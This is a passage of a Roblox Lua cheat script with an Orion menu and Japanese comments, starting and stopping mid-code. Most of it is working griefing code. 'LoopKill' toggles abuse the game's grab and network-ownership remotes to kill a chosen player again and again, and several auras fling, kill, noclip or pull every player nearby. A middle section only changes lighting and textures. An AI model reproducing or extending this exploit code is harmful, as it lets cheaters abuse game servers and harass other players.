        hum.BreakJointsOnDeath = false
        hum:ChangeState(Enum.HumanoidStateType.Dead)
        hum.Sit = false 
        hum.Jump = true  
    end 
    TarTab:AddToggle({
            Name = "LoopKill<font color=\"rgb(255, 255, 0)\"><b>[BLOB]</b></font>",
            Default = false,
            Callback = function(Value)
                bool.BypassAntiBlob1 = Value
                if Value then
                    etc.TargetPLR = game.Players:FindFirstChild(selectedPlrName)
                    etc.Root = etc.TargetPLR and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                    etc.Hum = etc.TargetPLR and etc.TargetPLR.Character:FindFirstChild("Humanoid")
                    local oldCF = char:GetPivot()
                    local blob = FindBlob() or SpawnToy("CreatureBlobman")
                    FWD(blob,"VehicleSeat"):Sit(hum)
                    local CreatureGrab = FWD(FWD(blob,"BlobmanSeatAndOwnerScript"),"CreatureGrab")
                    local CreatureRelease = FWD(FWD(blob,"BlobmanSeatAndOwnerScript"),"CreatureRelease")
                    local RightDetector = FWD(blob,"RightDetector")
                    local RightWeld = RightDetector and FWD(RightDetector,"RightWeld")
                    while not hum.SeatPart do task.wait() end 
                    task.spawn(function()
                        while bool.BypassAntiBlob1 and task.wait() do  
                            oldCF = char:GetPivot() 
                            etc.Root = getHRP(etc.TargetPLR.Character)
                            etc.Hum = etc.TargetPLR and etc.TargetPLR.Character:FindFirstChild("Humanoid")
                            if (not etc.Root or not etc.Hum) or _G.IsAboveLimit(etc.TargetPLR) or etc.Hum.Health == 0  then continue end 
                            while not RightWeld.Attachment0 and bool.BypassAntiBlob1 do
                                task.wait(0.05)
                                etc.Root = getHRP(etc.TargetPLR.Character)
                                etc.Hum = etc.TargetPLR and etc.TargetPLR.Character:FindFirstChild("Humanoid")
                                if (not etc.Root or not etc.Hum) or _G.IsAboveLimit(etc.TargetPLR) or etc.Hum.Health == 0  then char:PivotTo(oldCF) break end 
                                if not hum.SeatPart then  
                                    inv:FindFirstChild("CreatureBlobman").VehicleSeat:Sit(hum)
                                end 
                                char:PivotTo(etc.Root.CFrame)
                                hrp.AssemblyLinearVelocity = Vector3.zero
                                hrp.AssemblyAngularVelocity = Vector3.zero
                                CreatureGrab:FireServer(RightDetector,etc.Root,RightWeld)
                            end 
                            CreatureRelease:FireServer(RightWeld,etc.Root)
                            char:PivotTo(etc.Root.CFrame)
                            for _ = 1,10 do 
                                hrp.AssemblyLinearVelocity = Vector3.zero
                                hrp.AssemblyAngularVelocity = Vector3.zero
                                CreatureGrab:FireServer(RightDetector,etc.Root,RightWeld)
                                CreatureRelease:FireServer(RightWeld,etc.Root)
                                if isnetworkowner(etc.Root) then  
                                    ForceDeathNotG(etc.Hum)
                                end 
                                task.wait()
                            end 
                            char:PivotTo(oldCF)
                            hrp.AssemblyLinearVelocity = Vector3.zero
                            hrp.AssemblyAngularVelocity = Vector3.zero
                        end 
                    end)
                end
            end    
        })
    Players = game:GetService("Players")
    RunService = game:GetService("RunService")
    ReplicatedStorage = game:GetService("ReplicatedStorage")
    Workspace = game:GetService("Workspace")

    _G.LoopKill = false
    _G.LoopKillConnection = nil
    _G.SavedCFrame = nil
    _G.KillOffset = Vector3.new(5, -18.5, 0)
    _G.HeightLimit = 10000
    _G.KillDelay = 0.5

    function _G.IsAboveLimit(Player)
        if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
            return Player.Character.HumanoidRootPart.Position.Y > _G.HeightLimit
        end
        return true
    end

    function _G.DisableCollisions(Character)
        for _, Desc in pairs(Character:GetDescendants()) do
            if Desc:IsA("BasePart") then
                Desc.CanCollide = false
            end
        end
    end

    function _G.ForceDeath(Root, Humanoid)
        for _, Part in pairs(Humanoid.Parent:GetChildren()) do
            if Part:IsA("BasePart") then
                Part.CFrame = CFrame.new(-999999999999, 9999999999999, -999999999999)
            end
        end
        task.wait()
        for _, Part2 in pairs(Humanoid.Parent:GetChildren()) do
            if Part2:IsA("BasePart") then
                Part2.CFrame = CFrame.new(-999999999999, 9999999999999, -999999999999)
            end
        end
        BV = Instance.new("BodyVelocity")
        BV.Velocity = Vector3.new(0, 99999999999, 0)
        BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        BV.P = 100000075
        BV.Parent = Root
        Humanoid.Sit = false
        Humanoid.Jump = true
        Humanoid.BreakJointsOnDeath = false
        Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
        task.delay(2, function()
            if BV and BV.Parent then BV:Destroy() end
            BV = nil
        end)
    end

    function _G.ReturnToSavedPosition()
        Char = Players.LocalPlayer.Character
        if Char and Char:FindFirstChild("HumanoidRootPart") and _G.SavedCFrame then
            Char:PivotTo(_G.SavedCFrame)
        end
    end

    function _G.ExecuteKill(Player)
        if not _G.LoopKill or not Player or not Player.Character then return end
        if Workspace.PlotItems.PlayersInPlots:FindFirstChild(Player.Name) then return end

        Char = Player.Character
        Root = Char:FindFirstChild("HumanoidRootPart")
        Head = Char:FindFirstChild("Head")
        Humanoid = Char:FindFirstChild("Humanoid")
        if not (Root and Head and Humanoid) or Humanoid.Health <= 0 or _G.IsAboveLimit(Player) then return end

        SelfChar = Players.LocalPlayer.Character
        if not SelfChar or not SelfChar:FindFirstChild("HumanoidRootPart") then return end

        pcall(function()
            if not _G.LoopKill then return end
            SelfChar:PivotTo(CFrame.new(Root.Position + _G.KillOffset))
            _G.DisableCollisions(Char)
            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(Root, Root.CFrame)
            task.wait()
            _G.ReturnToSavedPosition()
            task.wait(0.1)
            ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(Root)
            task.wait(0.1)
            if Head:FindFirstChild("PartOwner") and Head.PartOwner.Value == Players.LocalPlayer.Name then
                _G.ForceDeath(Root, Humanoid)
            end
        end)
        task.wait(0.1)
    end

    function _G.LoopKillFunction()
        Char = Players.LocalPlayer.Character
        if not Char or not Char:FindFirstChild("HumanoidRootPart") then return end
        _G.SavedCFrame = Char:GetPivot()

        if not _G.LoopKill then return end
        Player = Players:FindFirstChild(selectedPlrName)
        if Player then  
            _G.ExecuteKill(Player)
        end

    end

    function _G.StartLoopKill()
        if _G.LoopKillConnection then _G.LoopKillConnection:Disconnect() end
        _G.LoopKillConnection = RunService.Heartbeat:Connect(function()
            if _G.LoopKill then
                _G.LoopKillFunction()
            else
                if _G.LoopKillConnection then
                    _G.LoopKillConnection:Disconnect()
                    _G.LoopKillConnection = nil
                end
            end
        end)
    end

    function _G.StopLoopKill()
        _G.LoopKill = false
        if _G.LoopKillConnection then
            _G.LoopKillConnection:Disconnect()
            _G.LoopKillConnection = nil
        end
        _G.SavedCFrame = nil
    end

    TarTab:AddToggle({
        Name = "LoopKill<font color=\"rgb(0, 255, 0)\"><b>[SNO]</b></font>",
        Default = false,
        Callback = function(Value)
            _G.LoopKill = Value
            if Value then 
                _G.StartLoopKill()
            else 
                _G.StopLoopKill()
            end
        end    
    })
    
    -- ====================== TxTab - 雰囲気エフェクト ======================
TxTab:AddSection({ Name = "Aosphere Effects" })

local function CreateAtmosphere(style)
    -- 既存のエフェクトを削除
    if CurrentAtmosphere then
        CurrentAtmosphere:Destroy()
    end

    local Lighting = game:GetService("Lighting")
    
    if style == "Dreamy" then
        CurrentAtmosphere = Instance.new("Atmosphere")
        CurrentAtmosphere.Density = 0.4
        CurrentAtmosphere.Offset = 0.25
        CurrentAtmosphere.Color = Color3.fromRGB(180, 200, 255)
        CurrentAtmosphere.Decay = Color3.fromRGB(80, 100, 180)
        CurrentAtmosphere.Glare = 0.6
        CurrentAtmosphere.Haze = 1.2
        CurrentAtmosphere.Parent = Lighting

        Lighting.Brightness = 2.5
        Lighting.ClockTime = 18.5
        Lighting.FogEnd = 800
        Lighting.FogColor = Color3.fromRGB(140, 170, 255)

    elseif style == "Cyber" then
        CurrentAtmosphere = Instance.new("Atmosphere")
        CurrentAtmosphere.Density = 0.25
        CurrentAtmosphere.Offset = 0.1
        CurrentAtmosphere.Color = Color3.fromRGB(0, 255, 200)
        CurrentAtmosphere.Decay = Color3.fromRGB(100, 0, 255)
        CurrentAtmosphere.Glare = 1
        CurrentAtmosphere.Haze = 0.8
        CurrentAtmosphere.Parent = Lighting

        Lighting.Brightness = 3
        Lighting.ClockTime = 0
        Lighting.Ambient = Color3.fromRGB(0, 100, 150)

    elseif style == "Horror" then
        CurrentAtmosphere = Instance.new("Atmosphere")
        CurrentAtmosphere.Density = 0.8
        CurrentAtmosphere.Offset = 0.5
        CurrentAtmosphere.Color = Color3.fromRGB(40, 20, 20)
        CurrentAtmosphere.Decay = Color3.fromRGB(80, 10, 10)
        CurrentAtmosphere.Glare = 0.3
        CurrentAtmosphere.Haze = 2
        CurrentAtmosphere.Parent = Lighting

        Lighting.Brightness = 0.4
        Lighting.ClockTime = 3
        Lighting.FogEnd = 300
        Lighting.FogColor = Color3.fromRGB(30, 10, 10)

    elseif style == "Sakura" then
        CurrentAtmosphere = Instance.new("Atmosphere")
        CurrentAtmosphere.Density = 0.35
        CurrentAtmosphere.Offset = 0.2
        CurrentAtmosphere.Color = Color3.fromRGB(255, 180, 220)
        CurrentAtmosphere.Decay = Color3.fromRGB(255, 100, 180)
        CurrentAtmosphere.Glare = 0.4
        CurrentAtmosphere.Haze = 1.4
        CurrentAtmosphere.Parent = Lighting

        Lighting.Brightness = 2.8
        Lighting.ClockTime = 16.5
    end
end

TxTab:AddDropdown({
    Name = "雰囲気エフェクト",
    Default = "None",
    Options = {"None", "Dreamy", "Cyber", "Horror", "Sakura"},
    Callback = function(Value)
        if Value == "None" then
            if CurrentAtmosphere then
                CurrentAtmosphere:Destroy()
                CurrentAtmosphere = nil
            end
            game.Lighting.Brightness = 1
            game.Lighting.ClockTime = 14
        else
            CreateAtmosphere(Value)
        end
    end
})

TxTab:AddButton({
    Name = "ランダム雰囲気",
    Callback = function()
        local styles = {"Dreamy", "Cyber", "Horror", "Sakura"}
        local random = styles[math.random(1, #styles)]
        CreateAtmosphere(random)
        OrionLib:MakeNotification({
            Name = "Atmosphere",
            Content = "ランダム: " .. random,
            Time = 3
        })
    end
})

TxTab:AddButton({
    Name = "リセット",
    Callback = function()
        if CurrentAtmosphere then
            CurrentAtmosphere:Destroy()
            CurrentAtmosphere = nil
        end
        local Lighting = game:GetService("Lighting")
        Lighting.Brightness = 1
        Lighting.ClockTime = 14
        Lighting.FogEnd = 100000
        Lighting.Ambient = Color3.fromRGB(128, 128, 128)
        OrionLib:MakeNotification({Name = "Atmosphere", Content = "リセットしました", Time = 2})
    end
})

TxTab:AddSection({ Name = "4K" })

TxTab:AddButton({
    Name = "4K (Realistic)",
    Callback = function()
        local Lighting = game:GetService("Lighting")
        
        -- 既存のAtmosphereを削除
        for _, v in pairs(Lighting:GetChildren()) do
            if v:IsA("Atmosphere") or v:IsA("BloomEffect") or v:IsA("ColorCorrectionEffect") then
                v:Destroy()
            end
        end

        -- Atmosphere（自然な大気）
        local atm = Instance.new("Atmosphere")
        atm.Density = 0.25
        atm.Offset = 0.1
        atm.Color = Color3.fromRGB(200, 210, 225)
        atm.Decay = Color3.fromRGB(180, 190, 210)
        atm.Glare = 0.4
        atm.Haze = 0.8
        atm.Parent = Lighting

        -- Bloom（自然な光の広がり）
        local bloom = Instance.new("BloomEffect")
        bloom.Intensity = 0.6
        bloom.Threshold = 0.8
        bloom.Size = 12
        bloom.Parent = Lighting

        -- ColorCorrection（自然な色調）
        local color = Instance.new("ColorCorrectionEffect")
        color.Brightness = 0.05
        color.Contrast = 0.15
        color.Saturation = 0.1
        color.TintColor = Color3.fromRGB(255, 248, 240)
        color.Parent = Lighting

        -- ライティング設定
        Lighting.Brightness = 2.2
        Lighting.ClockTime = 12.5          -- 昼間
        Lighting.FogEnd = 1200
        Lighting.FogColor = Color3.fromRGB(190, 200, 210)
        Lighting.Ambient = Color3.fromRGB(140, 140, 150)
        Lighting.EnvironmentDiffuseScale = 1
        Lighting.EnvironmentSpecularScale = 1

        OrionLib:MakeNotification({
            Name = "Realistic Mode",
            Content = "現実世界風エフェクトを適用しました",
            Time = 4
        })
    end
})

TxTab:AddButton({
    Name = "夕方4K (Evening)",
    Callback = function()
        local Lighting = game:GetService("Lighting")
        
        for _, v in pairs(Lighting:GetChildren()) do
            if v:IsA("Atmosphere") or v:IsA("BloomEffect") or v:IsA("ColorCorrectionEffect") then
                v:Destroy()
            end
        end

        local atm = Instance.new("Atmosphere")
        atm.Density = 0.35
        atm.Offset = 0.2
        atm.Color = Color3.fromRGB(255, 190, 140)
        atm.Decay = Color3.fromRGB(255, 140, 100)
        atm.Glare = 0.7
        atm.Haze = 1.1
        atm.Parent = Lighting

        local bloom = Instance.new("BloomEffect")
        bloom.Intensity = 0.8
        bloom.Threshold = 0.7
        bloom.Size = 15
        bloom.Parent = Lighting

        local color = Instance.new("ColorCorrectionEffect")
        color.Brightness = 0.08
        color.Contrast = 0.2
        color.Saturation = -0.1
        color.TintColor = Color3.fromRGB(255, 230, 180)
        color.Parent = Lighting

        Lighting.Brightness = 1.8
        Lighting.ClockTime = 17.8
        Lighting.FogEnd = 900
        Lighting.FogColor = Color3.fromRGB(255, 200, 160)

        OrionLib:MakeNotification({
            Name = "🌅 Evening Realistic",
            Content = "夕方4Kにしました",
            Time = 4
        })
    end
})

TxTab:AddButton({
    Name = "リセット",
    Callback = function()
        local Lighting = game:GetService("Lighting")
        for _, v in pairs(Lighting:GetChildren()) do
            if v:IsA("Atmosphere") or v:IsA("BloomEffect") or v:IsA("ColorCorrectionEffect") then
                v:Destroy()
            end
        end
        Lighting.Brightness = 1
        Lighting.ClockTime = 14
        Lighting.FogEnd = 100000
        Lighting.Ambient = Color3.fromRGB(128, 128, 128)

        OrionLib:MakeNotification({Name = "Reset", Content = "エフェクトをリセットしました", Time = 3})
    end
})
    -- ==================== MINECRAFT TEXTURE ====================
local MinecraftTexture = {
    Enabled = false,
}

local OriginalMaterials = {}
local OriginalColors = {}

local function SaveOriginal(obj)
    for _, v in pairs(obj:GetDescendants()) do
        if v:IsA("BasePart") and not OriginalMaterials[v] then
            OriginalMaterials[v] = v.Material
            OriginalColors[v] = v.Color
        end
    end
end

local function ApplyMinecraftTexture()
    SaveOriginal(Workspace)
    
    for _, v in pairs(Workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            local mat = v.Material
            local name = v.Name:lower()
            
            if name:find("grass") or name:find("ground") or mat == Enum.Material.Grass then
                v.Material = Enum.Material.Grass
                v.Color = Color3.fromRGB(90, 180, 50)     -- マイクラ風草
                
            elseif name:find("dirt") or mat == Enum.Material.Mud then
                v.Material = Enum.Material.Ground
                v.Color = Color3.fromRGB(140, 100, 60)
                
            elseif name:find("stone") or mat == Enum.Material.Rock or mat == Enum.Material.Basalt then
                v.Material = Enum.Material.Rock
                v.Color = Color3.fromRGB(110, 110, 110)
                
            elseif mat == Enum.Material.Wood or name:find("wood") then
                v.Material = Enum.Material.Wood
                v.Color = Color3.fromRGB(160, 110, 60)
                
            elseif mat == Enum.Material.Sand then
                v.Material = Enum.Material.Sand
                v.Color = Color3.fromRGB(230, 210, 140)
                
            elseif mat == Enum.Material.Water or name:find("water") then
                v.Material = Enum.Material.Water
                v.Color = Color3.fromRGB(60, 100, 255)
                v.Transparency = 0.4
                
            else
                -- その他は石っぽく
                v.Material = Enum.Material.Rock
                v.Color = Color3.fromRGB(130, 130, 130)
            end
        end
    end
end

local function RestoreOriginal()
    for part, mat in pairs(OriginalMaterials) do
        if part and part.Parent then
            part.Material = mat
            if OriginalColors[part] then
                part.Color = OriginalColors[part]
            end
        end
    end
    OriginalMaterials = {}
    OriginalColors = {}
end

TxTab:AddSection({Name = "<font color=\"rgb(0, 180, 60)\"><b>Minecraft Texture</b></font>"})

Toggles["MinecraftTexture"] = TxTab:AddToggle({
    Name = "Minecraft Texture",
    Default = false,
    Save = true,
    Flag = "MinecraftTexture",
    Callback = function(Value)
        MinecraftTexture.Enabled = Value
        if Value then
            ApplyMinecraftTexture()
            OrionLib:MakeNotification({
                Name = "テクスチャ変更",
                Content = "マップをマイクラにしたよ",
                Image = "tree",
                Time = 5
            })
        else
            RestoreOriginal()
            OrionLib:MakeNotification({
                Name = "テクスチャ変更",
                Content = "元のテクスチャに戻しました",
                Time = 5
            })
        end
    end    
})

TxTab:AddSlider({
    Name = "the brightness of the grass",
    Min = 50,
    Max = 255,
    Default = 180,
    Color = Color3.fromRGB(0, 255, 100),
    Callback = function(Value)
        if MinecraftTexture.Enabled then
            for _, v in pairs(Workspace:GetDescendants()) do
                if v:IsA("BasePart") and v.Material == Enum.Material.Grass then
                    v.Color = Color3.fromRGB(Value, math.floor(Value*0.9), math.floor(Value*0.6))
                end
            end
        end
    end    
})



TxTab:AddSection({ Name = "<b>Effect Selector</b>" })

-- =========================
-- トグル（エフェクトON/OFF）
-- =========================
TxTab:AddToggle({
	Name = "Effects Enable",
	Default = true,

	Callback = function(Value)
		EffectsEnabled = Value

		if not Value then
			-- OFF時：最低限に戻す
			Lighting.Brightness = 2
			Lighting.ClockTime = 14
			Lighting.FogEnd = 100000

			for _, v in pairs(Lighting:GetChildren()) do
				if v:IsA("Atmosphere")
				or v:IsA("BloomEffect")
				or v:IsA("ColorCorrectionEffect") then
					v.Enabled = false
				end
			end
		else
			-- ON時：再有効化
			for _, v in pairs(Lighting:GetChildren()) do
				if v:IsA("PostEffect") then
					v.Enabled = true
				end
			end
		end
	end
})

-- =========================
-- 明るさスライダー
-- =========================
TxTab:AddSlider({
	Name = "Brightness",
	Min = 0,
	Max = 5,
	Default = 2,
	Increment = 0.1,

	Callback = function(Value)
		if not EffectsEnabled then return end

		Lighting.Brightness = Value
	end
})

TxTab:AddDropdown({
	Name = "霧",
	Default = "Default",
	Options = {
		"Default",
		"Purple Aura",
		"ピンクオーロラ",
		"青緑オーロラ",
		"幻想的パープル",
		"サンセットオレンジ"
	},

	Callback = function(Value)

		-- 既存エフェクト削除（Skyも含め完全リセット）
		for _, v in pairs(Lighting:GetChildren()) do
			if v:IsA("Sky")
			or v:IsA("Atmosphere")
			or v:IsA("BloomEffect")
			or v:IsA("ColorCorrectionEffect")
			or v:IsA("DepthOfFieldEffect") then
				v:Destroy()
			end
		end

		if Value == "Default" then
			return
		end

		-- Sky作成（必ず入れる）
		local sky = Instance.new("Sky")
		sky.Parent = Lighting

		-- 紫オーロラ
		if Value == "Purple Aurora" then

			sky.SkyboxBk = "rbxassetid://600830446"
			sky.SkyboxDn = "rbxassetid://600831635"
			sky.SkyboxFt = "rbxassetid://600832720"
			sky.SkyboxLf = "rbxassetid://600833862"
			sky.SkyboxRt = "rbxassetid://600835177"
			sky.SkyboxUp = "rbxassetid://600836217"
			sky.StarCount = 6000

			local atm = Instance.new("Atmosphere")
			atm.Density = 0.45
			atm.Offset = 0.3
			atm.Color = Color3.fromRGB(120, 70, 255)
			atm.Decay = Color3.fromRGB(80, 40, 180)
			atm.Glare = 1.2
			atm.Haze = 1
			atm.Parent = Lighting

			local bloom = Instance.new("BloomEffect")
			bloom.Intensity = 1.8
			bloom.Threshold = 0.8
			bloom.Size = 30
			bloom.Parent = Lighting

			local cc = Instance.new("ColorCorrectionEffect")
			cc.Brightness = 0.2
			cc.Contrast = 0.3
			cc.Saturation = 0.9
			cc.TintColor = Color3.fromRGB(200, 120, 255)
			cc.Parent = Lighting

		-- ピンク
		elseif Value == "ピンクオーロラ" then

			sky.SkyboxUp = "rbxassetid://600836217"
			sky.StarCount = 5000

			local atm = Instance.new("Atmosphere")
			atm.Density = 0.4
			atm.Color = Color3.fromRGB(255, 80, 200)
			atm.Decay = Color3.fromRGB(200, 60, 150)
			atm.Parent = Lighting

		-- 青緑
		elseif Value == "青緑オーロラ" then

			sky.StarCount = 7000

			local atm = Instance.new("Atmosphere")
			atm.Density = 0.4
			atm.Color = Color3.fromRGB(80, 255, 220)
			atm.Decay = Color3.fromRGB(40, 180, 160)
			atm.Parent = Lighting

		-- 幻想パープル
		elseif Value == "幻想的パープル" then

			sky.StarCount = 12000

			local cc = Instance.new("ColorCorrectionEffect")
			cc.TintColor = Color3.fromRGB(180, 90, 255)
			cc.Saturation = 1.4
			cc.Brightness = 0.1
			cc.Parent = Lighting

		-- 星多め夜空
		elseif Value == "夜空 + 星多め" then

			sky.StarCount = 20000

		-- サンセット
		elseif Value == "サンセットオレンジ" then

			local cc = Instance.new("ColorCorrectionEffect")
			cc.TintColor = Color3.fromRGB(255, 160, 80)
			cc.Saturation = 0.6
			cc.Parent = Lighting
		end
	end
})

AuraTab:AddSection({ Name = "<b>Grab Aura</b>" })

AuraTab:AddToggle({
    Name = "Grab Aura",
    Default = false,
    Save = true,
    Flag = "GrabAura",
    Callback = function(enabled)
        bool.GrabAura = enabled
        
        cons:disc("GrabAura")
        
        if enabled then
            cons["GrabAura"] = RunService.Heartbeat:Connect(function()
                local lp = plr
                if not (lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")) then return end
                
                local humanoidRootPart = lp.Character.HumanoidRootPart
                local targets = {}
                
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= lp and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local playerTorso = player.Character:FindFirstChild("Torso") or player.Character:FindFirstChild("HumanoidRootPart")
                        if playerTorso then
                            local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                            if distance <= (int.AuraRadius or 30) then
                                table.insert(targets, player)
                            end
                        end
                    end
                end
                
                for _, player in pairs(targets) do
                    task.spawn(function()
                        local playerCharacter = player.Character
                        local playerTorso = playerCharacter and (playerCharacter:FindFirstChild("Torso") or playerCharacter:FindFirstChild("HumanoidRootPart"))
                        if playerTorso then
                            SetNetworkOwner:FireServer(playerTorso, playerCharacter.HumanoidRootPart.CFrame)
                            
                            local velocity = Instance.new("BodyVelocity")
                            velocity.Name = "AuraVelocity"
                            velocity.Velocity = Vector3.zero
                            velocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            velocity.Parent = playerTorso
                            Debris:AddItem(velocity, 0.1)
                        end
                    end)
                end
            end)
        end
    end
})

-- Radius Slider
AuraTab:AddSlider({
    Name = "Grab Aura Radius",
    Min = 5,
    Max = 100,
    Default = 30,
    Increment = 1,
    ValueName = " studs",
    Callback = function(Value)
        int.AuraRadius = Value
    end
})

AuraTab:AddSection({ Name = "<b>Noclip Aura</b>" })

AuraTab:AddToggle({
    Name = "Noclip Aura",
    Default = false,
    Save = true,
    Flag = "NoclipAura",
    Callback = function(Value)
        bool.NoclipAura = Value
        cons:disc("NoclipAura")

        if Value then
            cons["NoclipAura"] = task.spawn(function()
                while bool.NoclipAura do
                    local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                    
                    if root then
                        for _, player in ipairs(Players:GetPlayers()) do
                            if player ~= plr and player.Character then
                                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                                
                                if targetRoot and (targetRoot.Position - root.Position).Magnitude <= (int.AuraRadius or 50) then
                                    sno(targetRoot)
                                    
                                    for _, part in ipairs(player.Character:GetDescendants()) do
                                        if part:IsA("BasePart") then
                                            part.CanCollide = false
                                        end
                                    end
                                end
                            end
                        end
                    end
                    
                    task.wait(0.4)  -- 少し軽めに調整
                end
            end)
        end
    end
})

-- 範囲スライダー（全Aura共通）
AuraTab:AddSlider({
    Name = "Aura Range (Radius)",
    Min = 10,
    Max = 150,
    Default = 50,
    Increment = 5,
    ValueName = " studs",
    Save = true,
    Flag = "AuraRadius",
    Callback = function(Value)
        int.AuraRadius = Value
    end    
})

AuraTab:AddSection({ Name = "<b>嫌われオーラ</b>" })

AuraTab:AddToggle({
    Name = "嫌われオーラ",
    Default = false,
    Save = true,
    Flag = "RepelAura",
    Callback = function(Value)
        bool.RepelAura = Value
        cons:disc("RepelAura")

        if Value then
            cons["RepelAura"] = task.spawn(function()
                while bool.RepelAura do
                    local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        for _, player in ipairs(Players:GetPlayers()) do
                            if player ~= plr and player.Character then
                                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                                if targetRoot then
                                    local distance = (targetRoot.Position - root.Position).Magnitude
                                    
                                    if distance <= (int.AuraRadius or 60) then
                                        -- 自動で掴む
                                        sno(targetRoot)                    -- ネットワーク所有権
                                        CreateGrabLine:FireServer(targetRoot, targetRoot.CFrame)
                                        
                                        task.wait(0.05)  -- 掴むのを少し待つ
                                        
                                        -- 前方に強く飛ばす
                                        local direction = (targetRoot.Position - root.Position).Unit
                                        local flingVelocity = direction * 280 + Vector3.new(0, 45, 0) -- 前方 + 上昇
                                        
                                        targetRoot.AssemblyLinearVelocity = flingVelocity
                                        targetRoot.AssemblyAngularVelocity = Vector3.new(
                                            math.random(-80,80)*8, 
                                            math.random(-80,80)*8, 
                                            math.random(-80,80)*8
                                        )
                                        
                                        -- 補助BodyVelocity
                                        local bv = Instance.new("BodyVelocity")
                                        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        bv.Velocity = flingVelocity * 1.4
                                        bv.Parent = targetRoot
                                        Debris:AddItem(bv, 0.2)
                                    end
                                end
                            end
                        end
                    end
                    
                    task.wait(0.15)
                end
            end)
        end
    end
})

-- 範囲スライダー（全Aura共通）
AuraTab:AddSlider({
    Name = "Aura Range (Radius)",
    Min = 10,
    Max = 150,
    Default = 60,
    Increment = 5,
    ValueName = " studs",
    Save = true,
    Flag = "AuraRadius",
    Callback = function(Value)
        int.AuraRadius = Value
    end    
})

AuraTab:AddSection({ Name = "<b>Kill Aura</b>" })

AuraTab:AddToggle({
    Name = "Kill Aura",
    Default = false,
    Save = true,
    Flag = "KillAura",
    Callback = function(Value)
        bool.KillAura = Value
        cons:disc("KillAura")

        if Value then
            cons["KillAura"] = task.spawn(function()
                while bool.KillAura do
                    local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        for _, player in ipairs(Players:GetPlayers()) do
                            if player ~= plr and player.Character then
                                local targetChar = player.Character
                                local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                                local targetHum = targetChar:FindFirstChildOfClass("Humanoid")
                                
                                if targetRoot and targetHum and targetHum.Health > 0 then
                                    local distance = (targetRoot.Position - root.Position).Magnitude
                                    
                                    if distance <= (int.AuraRadius or 70) then
                                        -- ネットワーク所有権確保
                                        sno(targetRoot)
                                        CreateGrabLine:FireServer(targetRoot, targetRoot.CFrame)
                                        
                                        task.wait(0.05)
                                        
                                        -- === 即死処理（下落）===
                                        targetRoot.AssemblyLinearVelocity = Vector3.new(0, -800, 0)  -- 強力に下方向
                                        targetRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                                        
                                        -- 強制落下用BodyVelocity
                                        local bv = Instance.new("BodyVelocity")
                                        bv.Name = "KillVelocity"
                                        bv.MaxForce = Vector3.new(0, math.huge, 0)
                                        bv.Velocity = Vector3.new(0, -1000, 0)
                                        bv.Parent = targetRoot
                                        Debris:AddItem(bv, 0.6)
                                        
                                        -- 即死補助
                                        if targetHum then
                                            targetHum.Health = 0
                                            targetHum:ChangeState(Enum.HumanoidStateType.Dead)
                                        end
                                        
                                        -- さらに確実にするために位置を強制移動
                                        task.spawn(function()
                                            for i = 1, 6 do
                                                if targetRoot and targetRoot.Parent then
                                                    targetRoot.CFrame = targetRoot.CFrame * CFrame.new(0, -80, 0)
                                                end
                                                task.wait(0.1)
                                            end
                                        end)
                                    end
                                end
                            end
                        end
                    end
                    task.wait(0.15)
                end
            end)
        end
    end
})

-- ==================== AUTO BRING ====================
AuraTab:AddSection({ Name = "<b>Auto Bring</b>" })

AuraTab:AddToggle({
    Name = "Auto Bring",
    Default = false,
    Save = true,
    Flag = "AutoBring",
    Callback = function(Value)
        bool.AutoBring = Value
        cons:disc("AutoBring")

        if Value then
            cons["AutoBring"] = task.spawn(function()
                while bool.AutoBring do
                    local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        for _, player in ipairs(Players:GetPlayers()) do
                            if player ~= plr and player.Character then
                                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                                
                                if targetRoot then
                                    local distance = (targetRoot.Position - root.Position).Magnitude
                                    
                                    if distance <= (int.AuraRadius or 70) and distance > 8 then
                                        sno(targetRoot)
                                        CreateGrabLine:FireServer(targetRoot, root.CFrame * CFrame.new(0, 5, -8))
                                        
                                        -- 少し強制的に近づける
                                        targetRoot.AssemblyLinearVelocity = (root.Position - targetRoot.Position).Unit * 120
                                    end
                                end
                            end
                        end
                    end
                    task.wait(0.18)
                end
            end)
        end
    end
})

-- 範囲スライダー（全Aura共通）
AuraTab:AddSlider({
    Name = "Aura Range",
    Min = 10,
    Max = 150,
    Default = 70,
    Increment = 5,
    ValueName = " studs",
    Save = true,
    Flag = "AuraRadius",
    Callback = function(Value)
        int.AuraRadius = Value
    end    
})

AuraTab:AddSection({ Name = "<b>Sit Aura</b>" })

AuraTab:AddToggle({
    Name = "Sit Aura",
    Default = false,
    Save = true,
    Flag = "AutoGrab",
    Callback = function(Value)
        bool.AutoGrab = Value
        cons:disc("AutoGrab")

        if Value then
            cons["AutoGrab"] = task.spawn(function()
                while bool.AutoGrab do
                    local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        for _, player in ipairs(Players:GetPlayers()) do
                            if player ~= plr and player.Character then
                                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                                if targetRoot then
                                    local distance = (targetRoot.Position - root.Position).Magnitude
                                    
                                    -- 目の前（前方60度以内）にいるかチェック
                                    local direction = (targetRoot.Position - root.Position).Unit
                                    local forward = root.CFrame.LookVector
                                    local angle = math.acos(forward:Dot(direction))
                                    
                                    if distance <= (int.AuraRadius or 70) and angle <= math.rad(60) then
                                        -- 自動掴み
                                        sno(targetRoot)
